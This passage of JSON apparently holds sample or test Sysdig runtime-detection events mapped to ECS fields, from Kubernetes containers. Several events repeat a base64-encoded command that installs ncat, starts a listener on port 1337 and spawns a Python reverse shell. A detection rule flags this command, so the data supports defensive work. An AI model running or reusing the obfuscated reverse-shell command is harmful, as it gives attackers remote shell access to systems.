                                "digest": "sha256:9360d7421c5e9b646ea13e5ced3f8e6da80017b0144733a04b7401dd8c01a5cb",
                                "id": "3f3e5f568a6d",
                                "repo": "gcr.io/cadvisor/cadvisor",
                                "tag": "v0.45.0"
                            },
                            "label": {
                                "io": {
                                    "kubernetes": {
                                        "container": {
                                            "name": "cadvisor"
                                        },
                                        "pod": {
                                            "name": "wave-autoscale-agent-abcde",
                                            "namespace": "wave-autoscale"
                                        }
                                    }
                                }
                            },
                            "name": "cadvisor"
                        },
                        "host": {
                            "host_name": "hybrid-node",
                            "mac": "01-00-5E-90-10-02"
                        },
                        "kubernetes": {
                            "cluster": {
                                "name": "myclusterName"
                            },
                            "namespace": {
                                "name": "wave-autoscale"
                            },
                            "node": {
                                "name": "node04"
                            },
                            "pod": {
                                "name": "wave-autoscale-agent-abcde"
                            }
                        }
                    },
                    "name": "Sysdig Runtime Notable Events",
                    "originator": "policy",
                    "raw_event_category": "runtime",
                    "raw_event_originator": "linuxAgent",
                    "severity": 5,
                    "severity_value": "Medium",
                    "source": "syscall",
                    "source_details": {
                        "sub_type": "container",
                        "type": "workload"
                    },
                    "timestamp": "2025-04-15T07:13:45.52835Z"
                }
            },
            "tags": [
                "preserve_duplicate_custom_fields"
            ],
            "threat": {
                "tactic": {
                    "id": [
                        "TA0002",
                        "TA0004",
                        "TA0008",
                        "TA0005"
                    ],
                    "name": [
                        "execution",
                        "privilege_escalation",
                        "lateral_movement",
                        "defense_evasion"
                    ]
                },
                "technique": {
                    "id": [
                        "T1609",
                        "T1611",
                        "T1610",
                        "T1543"
                    ],
                    "name": [
                        "container_administration_command",
                        "escape_to_host",
                        "deploy_container",
                        "create_or_modify_system_process"
                    ],
                    "subtechnique": {
                        "id": [
                            "T1055.009"
                        ],
                        "name": [
                            "process_injection_proc_memory"
                        ]
                    }
                }
            },
            "user": {
                "group": {
                    "id": "0",
                    "name": "root"
                },
                "id": "0",
                "name": "root"
            }
        },
        {
            "@timestamp": "2025-04-18T09:00:00.8410903Z",
            "cloud": {
                "account": {
                    "id": "012345678912"
                },
                "project": {
                    "id": "012345678912"
                },
                "provider": "gcp",
                "region": "us-central1"
            },
            "container": {
                "id": "4db57cd1354c",
                "image": {
                    "hash": {
                        "all": [
                            "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a"
                        ]
                    }
                },
                "name": "shell-scripting"
            },
            "ecs": {
                "version": "8.11.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "id": "183a5e0123456789zbcdef400ba6d116",
                "kind": "event",
                "original": "{\"category\":\"runtime\",\"content\":{\"fields\":{\"container.id\":\"4db57cd1354c\",\"container.name\":\"shell-scripting\",\"group.gid\":\"0\",\"group.name\":\"root\",\"proc.cmdline\":\"bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh\",\"proc.cwd\":\"/\",\"proc.exepath\":\"/usr/bin/bash\",\"proc.hash.sha256\":\"7ebfc53f17925af4340d4218aafd16ba39b5afa8b6ac1f7adc3dd92952a2a237\",\"proc.name\":\"bash\",\"proc.pcmdline\":\"runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/init.pid 4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe\",\"proc.pid\":\"97888\",\"proc.pname\":\"runc\",\"proc.ppid\":\"97881\",\"proc.sid\":\"1\",\"user.loginname\":\"<NA>\",\"user.loginuid\":\"-1\",\"user.name\":\"root\",\"user.uid\":\"0\"},\"origin\":\"Sysdig\",\"output\":\"Potentially malicious Shell script base64-encoded under user root on shell-scripting (proc.name=bash proc.exepath=/usr/bin/bash proc.pname=runc gparent=containerd-shim ggparent=containerd-shim gggparent=containerd proc.cmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root proc.pid=97888 proc.cwd=/ proc.ppid=97881 proc.pcmdline=runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/init.pid 4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe proc.sid=1 user.uid=0 user.loginuid=-1 user.loginname=<NA> group.gid=0 group.name=root container.id=4db57cd1354c container.name=shell-scripting)\",\"policyId\":10011698,\"ruleName\":\"Base64-encoded Shell Script Execution\",\"ruleSubType\":0,\"ruleTags\":[\"host\",\"container\",\"MITRE\",\"MITRE_T1132.001_data_encoding_standard_encoding\",\"MITRE_TA0011_command_and_control\",\"MITRE_TA0005_defense_evasion\",\"MITRE_T1059.004_command_and_scripting_interpreter_unix_shell\",\"MITRE_T1059_command_and_scripting_interpreter\",\"MITRE_TA0002_execution\",\"MITRE_T1027_obfuscated_files_and_information\",\"MITRE_T1140_deobfuscate_decode_files_or_information\"],\"ruleType\":6,\"type\":\"workloadRuntimeDetection\"},\"description\":\"This policy contains rules which Sysdig considers High Confidence of a security incident. They are tightly coupled to common attacker TTP's. They have been designed to minimize false positives but may still result in some depending on your environment.\",\"engine\":\"falco\",\"id\":\"183a5e0123456789zbcdef400ba6d116\",\"labels\":{\"cloudProvider.account.id\":\"012345678912\",\"cloudProvider.name\":\"gcp\",\"cloudProvider.region\":\"us-central1\",\"container.image.digest\":\"sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a\",\"container.image.id\":\"ef0f72a55bd2\",\"container.image.repo\":\"docker.io/library/python\",\"container.image.tag\":\"3.9.18-slim\",\"container.label.io.kubernetes.container.name\":\"shell-scripting\",\"container.label.io.kubernetes.pod.name\":\"shell-scripting-1234567-12345\",\"container.label.io.kubernetes.pod.namespace\":\"default\",\"container.name\":\"shell-scripting\",\"gcp.location\":\"us-central1\",\"gcp.projectId\":\"012345678912\",\"host.hostName\":\"gke-cluster-gcp-demo-san-default-pool-12345678-1234\",\"host.mac\":\"01:00:5e:90:10:00\",\"kubernetes.cluster.name\":\"gke-alliances-demo-6\",\"kubernetes.cronJob.name\":\"shell-scripting\",\"kubernetes.job.name\":\"shell-scripting-29082780\",\"kubernetes.namespace.name\":\"default\",\"kubernetes.node.name\":\"gke-cluster-gcp-demo-san-default-pool-12345678-1234\",\"kubernetes.pod.name\":\"shell-scripting-00123450-abcd5\",\"kubernetes.workload.name\":\"shell-scripting\",\"kubernetes.workload.type\":\"cronjob\"},\"name\":\"Sysdig Runtime Threat Detection\",\"originator\":\"policy\",\"rawEventCategory\":\"runtime\",\"rawEventOriginator\":\"linuxAgent\",\"severity\":3,\"source\":\"syscall\",\"sourceDetails\":{\"subType\":\"container\",\"type\":\"workload\"},\"timestamp\":1744966800841090300}",
                "provider": "syscall",
                "severity": 3,
                "type": [
                    "info"
                ]
            },
            "host": {
                "hostname": "gke-cluster-gcp-demo-san-default-pool-12345678-1234",
                "mac": [
                    "01-00-5E-90-10-00"
                ],
                "name": "gke-cluster-gcp-demo-san-default-pool-12345678-1234"
            },
            "message": "Potentially malicious Shell script base64-encoded under user root on shell-scripting (proc.name=bash proc.exepath=/usr/bin/bash proc.pname=runc gparent=containerd-shim ggparent=containerd-shim gggparent=containerd proc.cmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root proc.pid=97888 proc.cwd=/ proc.ppid=97881 proc.pcmdline=runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/init.pid 4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe proc.sid=1 user.uid=0 user.loginuid=-1 user.loginname=<NA> group.gid=0 group.name=root container.id=4db57cd1354c container.name=shell-scripting)",
            "observer": {
                "product": "Sysdig Secure",
                "vendor": "Sysdig"
            },
            "orchestrator": {
                "cluster": {
                    "name": "gke-alliances-demo-6"
                },
                "namespace": "default",
                "resource": {
                    "name": "shell-scripting-00123450-abcd5",
                    "parent": {
                        "type": "cronjob"
                    }
                }
            },
            "process": {
                "command_line": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                "executable": "/usr/bin/bash",
                "hash": {
                    "sha256": "7ebfc53f17925af4340d4218aafd16ba39b5afa8b6ac1f7adc3dd92952a2a237"
                },
                "name": "bash",
                "parent": {
                    "command_line": "runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/init.pid 4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe",
                    "name": "runc",
                    "pid": 97881
                },
                "pid": 97888,
                "working_directory": "/"
            },
            "related": {
                "hash": [
                    "7ebfc53f17925af4340d4218aafd16ba39b5afa8b6ac1f7adc3dd92952a2a237",
                    "aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a"
                ],
                "hosts": [
                    "gke-cluster-gcp-demo-san-default-pool-12345678-1234"
                ],
                "user": [
                    "root",
                    "0"
                ]
            },
            "rule": {
                "description": "This policy contains rules which Sysdig considers High Confidence of a security incident. They are tightly coupled to common attacker TTP's. They have been designed to minimize false positives but may still result in some depending on your environment.",
                "name": "Base64-encoded Shell Script Execution",
                "ruleset": "Sysdig Runtime Threat Detection"
            },
            "sysdig": {
                "event": {
                    "category": "runtime",
                    "content": {
                        "fields": {
                            "container": {
                                "id": "4db57cd1354c",
                                "name": "shell-scripting"
                            },
                            "group": {
                                "gid": "0",
                                "name": "root"
                            },
                            "proc": {
                                "cmdline": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                                "cwd": "/",
                                "exepath": "/usr/bin/bash",
                                "hash": {
                                    "sha256": "7ebfc53f17925af4340d4218aafd16ba39b5afa8b6ac1f7adc3dd92952a2a237"
                                },
                                "name": "bash",
                                "pcmdline": "runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/init.pid 4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe",
                                "pid": 97888,
                                "pname": "runc",
                                "ppid": 97881,
                                "sid": "1"
                            },
                            "user": {
                                "name": "root",
                                "uid": "0"
                            }
                        },
                        "origin": "Sysdig",
                        "output": "Potentially malicious Shell script base64-encoded under user root on shell-scripting (proc.name=bash proc.exepath=/usr/bin/bash proc.pname=runc gparent=containerd-shim ggparent=containerd-shim gggparent=containerd proc.cmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root proc.pid=97888 proc.cwd=/ proc.ppid=97881 proc.pcmdline=runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/init.pid 4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe proc.sid=1 user.uid=0 user.loginuid=-1 user.loginname=<NA> group.gid=0 group.name=root container.id=4db57cd1354c container.name=shell-scripting)",
                        "policy_id": "10011698",
                        "rule_name": "Base64-encoded Shell Script Execution",
                        "rule_sub_type": 0,
                        "rule_tags": [
                            "host",
                            "container",
                            "MITRE",
                            "MITRE_T1132.001_data_encoding_standard_encoding",
                            "MITRE_TA0011_command_and_control",
                            "MITRE_TA0005_defense_evasion",
                            "MITRE_T1059.004_command_and_scripting_interpreter_unix_shell",
                            "MITRE_T1059_command_and_scripting_interpreter",
                            "MITRE_TA0002_execution",
                            "MITRE_T1027_obfuscated_files_and_information",
                            "MITRE_T1140_deobfuscate_decode_files_or_information"
                        ],
                        "rule_type": 6,
                        "type": "workloadRuntimeDetection"
                    },
                    "description": "This policy contains rules which Sysdig considers High Confidence of a security incident. They are tightly coupled to common attacker TTP's. They have been designed to minimize false positives but may still result in some depending on your environment.",
                    "engine": "falco",
                    "id": "183a5e0123456789zbcdef400ba6d116",
                    "labels": {
                        "cloud_provider": {
                            "account": {
                                "id": "012345678912"
                            },
                            "name": "gcp",
                            "region": "us-central1"
                        },
                        "container": {
                            "image": {
                                "digest": "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a",
                                "id": "ef0f72a55bd2",
                                "repo": "docker.io/library/python",
                                "tag": "3.9.18-slim"
                            },
                            "label": {
                                "io": {
                                    "kubernetes": {
                                        "container": {
                                            "name": "shell-scripting"
                                        },
                                        "pod": {
                                            "name": "shell-scripting-1234567-12345",
                                            "namespace": "default"
                                        }
                                    }
                                }
                            },
                            "name": "shell-scripting"
                        },
                        "gcp": {
                            "location": "us-central1",
                            "project_id": "012345678912"
                        },
                        "host": {
                            "host_name": "gke-cluster-gcp-demo-san-default-pool-12345678-1234",
                            "mac": "01-00-5E-90-10-00"
                        },
                        "kubernetes": {
                            "cluster": {
                                "name": "gke-alliances-demo-6"
                            },
                            "cron_job": {
                                "name": "shell-scripting"
                            },
                            "job": {
                                "name": "shell-scripting-29082780"
                            },
                            "namespace": {
                                "name": "default"
                            },
                            "node": {
                                "name": "gke-cluster-gcp-demo-san-default-pool-12345678-1234"
                            },
                            "pod": {
                                "name": "shell-scripting-00123450-abcd5"
                            },
                            "workload": {
                                "name": "shell-scripting",
                                "type": "cronjob"
                            }
                        }
                    },
                    "name": "Sysdig Runtime Threat Detection",
                    "originator": "policy",
                    "raw_event_category": "runtime",
                    "raw_event_originator": "linuxAgent",
                    "severity": 3,
                    "severity_value": "High",
                    "source": "syscall",
                    "source_details": {
                        "sub_type": "container",
                        "type": "workload"
                    },
                    "timestamp": "2025-04-18T09:00:00.8410903Z"
                }
            },
            "tags": [
                "preserve_duplicate_custom_fields"
            ],
            "threat": {
                "tactic": {
                    "id": [
                        "TA0011",
                        "TA0005",
                        "TA0002"
                    ],
                    "name": [
                        "command_and_control",
                        "defense_evasion",
                        "execution"
                    ]
                },
                "technique": {
                    "id": [
                        "T1059",
                        "T1027",
                        "T1140"
                    ],
                    "name": [
                        "command_and_scripting_interpreter",
                        "obfuscated_files_and_information",
                        "deobfuscate_decode_files_or_information"
                    ],
                    "subtechnique": {
                        "id": [
                            "T1132.001",
                            "T1059.004"
                        ],
                        "name": [
                            "data_encoding_standard_encoding",
                            "command_and_scripting_interpreter_unix_shell"
                        ]
                    }
                }
            },
            "user": {
                "group": {
                    "id": "0",
                    "name": "root"
                },
                "id": "0",
                "name": "root"
            }
        },
        {
            "@timestamp": "2025-04-16T03:01:01.1951498Z",
            "cloud": {
                "account": {
                    "id": "012345678912"
                },
                "project": {
                    "id": "012345678912"
                },
                "provider": "gcp",
                "region": "us-central1"
            },
            "container": {
                "image": {
                    "hash": {
                        "all": [
                            "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a"
                        ]
                    },
                    "name": "docker.io/library/python"
                },
                "name": "shell-scripting"
            },
            "ecs": {
                "version": "8.11.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "id": "1a36a012345678998765432108f1e03e",
                "kind": "event",
                "original": "{\"category\":\"runtime\",\"content\":{\"fields\":{\"container.image.repository\":\"docker.io/library/python\",\"container.name\":\"shell-scripting\",\"evt.res\":\"SUCCESS\",\"evt.type\":\"execve\",\"group.gid\":\"0\",\"group.name\":\"root\",\"proc.args\":\"\",\"proc.cmdline\":\"sh\",\"proc.cwd\":\"/\",\"proc.exepath\":\"/usr/bin/dash\",\"proc.hash.sha256\":\"f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6\",\"proc.name\":\"sh\",\"proc.pcmdline\":\"bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh\",\"proc.pid\":\"4094247\",\"proc.pid.ts\":\"1744772461104588229\",\"proc.pname\":\"bash\",\"proc.ppid\":\"4093769\",\"proc.ppid.ts\":\"1744772400850031947\",\"proc.sid\":\"1\",\"user.loginname\":\"<NA>\",\"user.loginuid\":\"-1\",\"user.name\":\"root\",\"user.uid\":\"0\"},\"origin\":\"Secure UI\",\"output\":\"Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=containerd-shim ggparent=<NA> gggparent=<NA> image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=4094247 proc.cwd=/ proc.ppid=4093769 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1744772461104588229 proc.ppid.ts=1744772400850031947 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)\",\"policyId\":10569534,\"ruleName\":\"My test rule custom\",\"ruleSubType\":0,\"ruleTags\":[\"My-tag-custom-1-hello-world\",\"MITTRE-WHATEVER\"],\"ruleType\":6,\"type\":\"workloadRuntimeDetection\"},\"description\":\"This is just a dumb policy to test custom policies\",\"engine\":\"falco\",\"id\":\"1a36a012345678998765432108f1e03e\",\"labels\":{\"cloudProvider.account.id\":\"012345678912\",\"cloudProvider.name\":\"gcp\",\"cloudProvider.region\":\"us-central1\",\"container.image.digest\":\"sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a\",\"container.image.id\":\"ef0f72a55bd2\",\"container.image.repo\":\"docker.io/library/python\",\"container.image.tag\":\"3.9.18-slim\",\"container.label.io.kubernetes.container.name\":\"shell-scripting\",\"container.label.io.kubernetes.pod.name\":\"shell-scripting-29079540-cqf5n\",\"container.label.io.kubernetes.pod.namespace\":\"default\",\"container.name\":\"shell-scripting\",\"gcp.location\":\"us-central1\",\"gcp.projectId\":\"012345678912\",\"host.hostName\":\"gke-cluster-gcp-demo-san-default-pool-12345678-abcd\",\"host.mac\":\"01:00:5e:90:10:00\",\"kubernetes.cluster.name\":\"gke-alliances-demo-6\",\"kubernetes.cronJob.name\":\"shell-scripting\",\"kubernetes.job.name\":\"shell-scripting-29079540\",\"kubernetes.namespace.name\":\"default\",\"kubernetes.node.name\":\"gke-cluster-gcp-demo-san-default-pool-12345678-abcd\",\"kubernetes.pod.name\":\"shell-scripting-12345678-abcde\",\"kubernetes.workload.name\":\"shell-scripting\",\"kubernetes.workload.type\":\"cronjob\"},\"name\":\"Manuel test policy\",\"originator\":\"policy\",\"rawEventCategory\":\"runtime\",\"rawEventOriginator\":\"linuxAgent\",\"severity\":4,\"source\":\"syscall\",\"sourceDetails\":{\"subType\":\"container\",\"type\":\"workload\"},\"timestamp\":1744772461195149800}",
                "outcome": "success",
                "provider": "syscall",
                "severity": 4,
                "type": [
                    "info"
                ]
            },
            "host": {
                "hostname": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd",
                "mac": [
                    "01-00-5E-90-10-00"
                ],
                "name": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd"
            },
            "message": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=containerd-shim ggparent=<NA> gggparent=<NA> image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=4094247 proc.cwd=/ proc.ppid=4093769 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1744772461104588229 proc.ppid.ts=1744772400850031947 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
            "observer": {
                "product": "Sysdig Secure",
                "vendor": "Sysdig"
            },
            "orchestrator": {
                "cluster": {
                    "name": "gke-alliances-demo-6"
                },
                "namespace": "default",
                "resource": {
                    "name": "shell-scripting-12345678-abcde",
                    "parent": {
                        "type": "cronjob"
                    }
                }
            },
            "process": {
                "command_line": "sh",
                "executable": "/usr/bin/dash",
                "hash": {
                    "sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6"
                },
                "name": "sh",
                "parent": {
                    "command_line": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                    "name": "bash",
                    "pid": 4093769,
                    "start": "2025-04-16T03:00:00.850031947Z"
                },
                "pid": 4094247,
                "start": "2025-04-16T03:01:01.104588229Z",
                "working_directory": "/"
            },
            "related": {
                "hash": [
                    "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6",
                    "aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a"
                ],
                "hosts": [
                    "gke-cluster-gcp-demo-san-default-pool-12345678-abcd"
                ],
                "user": [
                    "root",
                    "0"
                ]
            },
            "rule": {
                "description": "This is just a dumb policy to test custom policies",
                "name": "My test rule custom",
                "ruleset": "Manuel test policy"
            },
            "sysdig": {
                "event": {
                    "category": "runtime",
                    "content": {
                        "fields": {
                            "container": {
                                "image": {
                                    "repository": "docker.io/library/python"
                                },
                                "name": "shell-scripting"
                            },
                            "evt": {
                                "res": "SUCCESS",
                                "type": "execve"
                            },
                            "group": {
                                "gid": "0",
                                "name": "root"
                            },
                            "proc": {
                                "cmdline": "sh",
                                "cwd": "/",
                                "exepath": "/usr/bin/dash",
                                "hash": {
                                    "sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6"
                                },
                                "name": "sh",
